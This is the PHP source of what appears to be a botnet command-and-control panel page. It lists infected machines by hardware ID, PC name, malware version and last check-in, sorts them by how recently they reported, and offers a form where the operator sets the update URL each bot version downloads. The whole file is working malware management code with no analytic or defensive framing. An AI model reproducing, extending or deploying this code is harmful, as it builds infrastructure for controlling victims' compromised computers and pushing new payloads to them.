<?php
if (!defined('AUTHED') || !AUTHED)
	die('no direct xs');

$res = mysql_query("SELECT seen, version, hwid, pcn FROM bots ORDER BY version");
$n = mysql_num_rows($res);

$ton = time() - $GLOBALS['updateinterval'] - 15; //online now (15 sec tolerance)
$thd = time() - 12 * 60 * 60; //last 12 hrs
$on = 0;
$hd = 0;

$boton = array();
$botoff = array();
$botded = array();

$v = array();
$updatearr = array();

while ($row = mysql_fetch_assoc($res)) {
	$id = '<a href="?show=logs&hwid=' . htmlentities($row['hwid']) . '">' . htmlentities($row['hwid']) . '</a>@' . htmlentities($row['pcn']) . 
		' (' . htmlentities($row['version']) . ') . last seen on ' . date('d F Y H:i:s', $row['seen']);
	if ($row['seen'] >= $ton) {
		array_push($boton, $id);
		$on++;
	} else if ($row['seen'] >= $thd) {
		array_push($botoff, $id);
		$hd++;
	} else
		array_push($botded, $id);
	
	if (!isset($v[$row['version']]))
		$v[$row['version']] = 1;
	else
		$v[$row['version']]++;
		
	$updatearr[$row['version']] = '';
}

print "Overall: $n Bots ($on online, $hd online in last 12 hours)<br /><br />";
mt_srand(0x1c0);
if ($n) {
	$wn = 800;
	$won = ceil($wn / $n * $on);
	$whd = ceil($wn / $n * $hd);
	$wrs = ceil($wn - $won - $whd);
	if ($wrs < 0)
		$wrs = 0;

	print "<br /><br /><style>#on{float:left;width:{$won}px;background-color:green;}".
		"#hd{float:left;width:{$whd}px;background-color:yellow;}#rest{float:left;width:{$wrs}px;background-color:red;}</style>";
	print "<div id='on'>on: $on</div><div id='hd'>last 12 hrs: $hd</div><div id='rest'>overall: $n</div><br /><br /><br /><h2>Version Control</h2>";
	
	
	$wn = 800;
	foreach ($v as $ver => $cnt) {
		$w = 800 / $n * $cnt;
		$clr = "#" . dechex(mt_rand(0, 0xffffff));
		print "<div style='float:left;width:{$w}px;background-color:{$clr};}'>" . htmlentities($ver, ENT_QUOTES) . ": $cnt</div>";
	}
}

if (isset($_GET['update']) && $_POST['upd'] === 'Save') {
	if (!mysql_query('TRUNCATE TABLE version'))
		mysql_query('DELETE FROM version');
	
	$sql = 'INSERT INTO version (ver, url) VALUES';
	$c = 0;
	foreach ($_POST as $key => $val)
		if (substr($key, 0, 4) === 'url_') {
			$v = mysql_real_escape_string(base64_decode(substr($key, 4)));
			$u = mysql_real_escape_string($val);
			
			if (!isset($_POST['del_'.substr($key, 4)])) {
				$c++;
				$sql .= "('$v', '$u'),";
			}
		}
	if ($c)
		mysql_query(substr($sql, 0, -1));
}

print '<br /><br /><form action="?show=stats&update" method="POST"><table><tr><td>Version</td><td>Update URL</td><td>Delete</td></tr>';
$res = mysql_query("SELECT * FROM version");

while ($row = mysql_fetch_assoc($res))
	$updatearr[$row['ver']] = $row['url'];

foreach ($updatearr as $ver => $url) {
	$url = htmlentities($url, ENT_QUOTES);
	$bver = base64_encode($ver);
	print '<tr><td>' . htmlentities($ver) . "</td><td><input type='text' style='width:300px;' name='url_$bver' value='$url' /></td><td><input type='checkbox' name='del_$bver' /></td></tr>";
}

print '</table><br /><input type="submit" value="Save" name="upd" /></form>' .
	'<br /><br /><h2>Bot Control</h2>Its ' . date('d F Y H:i:s', time()) . '<br />Online:<div style="color:green;">';
foreach ($boton as $on)
	print "$on<br />";
print '</div><br />Last 12 hrs:<div style="color:yellow;">';
foreach ($botoff as $off)
	print "$off<br />";
print '</div><br />Offline for more than 12 hrs:<div style="color:red;">';
foreach ($botded as $ded)
	print "$ded<br />";
?>